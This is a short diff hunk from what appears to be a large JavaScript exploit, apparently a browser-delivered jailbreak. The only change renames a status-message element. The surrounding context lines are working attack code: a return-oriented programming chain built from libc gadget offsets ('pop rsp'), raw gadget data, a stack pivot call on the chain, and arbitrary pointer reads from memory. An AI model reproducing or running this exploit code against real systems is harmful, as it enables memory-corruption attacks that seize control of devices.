@@ -94930,7 +94930,7 @@ libc_base+782311 //pop rsp
 db([0, 0]); // 0x0
 //L12960:
 db([2, 0, 0, 0, 0, 0]);
-progress.innerHTML=LoadedMSG;
+msgs.innerHTML=LoadedMSG;
 pivot(ropchain);
 var main_ret = read_ptr_at(main_ret);
 var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
